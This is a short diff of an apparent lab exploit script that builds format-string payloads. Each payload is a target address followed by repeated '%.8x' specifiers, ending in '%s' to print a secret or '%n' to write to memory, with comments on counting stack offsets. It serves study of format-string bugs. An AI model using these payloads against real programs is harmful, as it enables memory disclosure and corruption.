@@ -28,10 +28,12 @@ padding =  "%.8x	|"*23 + "\xc0\x87\x04\x08" + "%s"
 padding =  "\x40\xa0\x04\x08"+"%.8x"*24
 padding = "\x5c\x78\x34\x34\x5c\x78\x61\x30\x5c\x78\x30\x34\x5c\x78\x30\x38"  + "%.8x"*22 + "%s"
 padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%s"
-padding = "\xe0\x87\x04\x08"+"%.8x"*23 + "%s"  ## This prints the secret
-padding = "\x40\xa0\x04\x08"+"%.8x"*24 # target is a number no string format is needed (%s)
-padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%n"
-padding = "\x40\xa0\x04\x08"+"%x"*22 + %.100x "%n"
+
+# payload value for the "Read the secret scenario"
+padding = "\xe0\x87\x04\x08"+"%.8x|"*23 + "\n23 percent x's to get / Remember precision (eg. the number of actual values) is different than distance(percent-x's)=> %s"  ## This prints the secret
+# padding = "\x40\xa0\x04\x08"+"%.8x"*24 # target is a number no string format is needed (%s)
+# padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%n"
+# padding = "\x40\xa0\x04\x08"+"%x"*22 + %.100x "%n"
 # %x = 4 bytes/4char
 # calculate chars (address) [4bytes] + (22*4)[88] + 100x = 192 percision -> this is the nubmer used for the %n value
 # number written is binary into the %n 
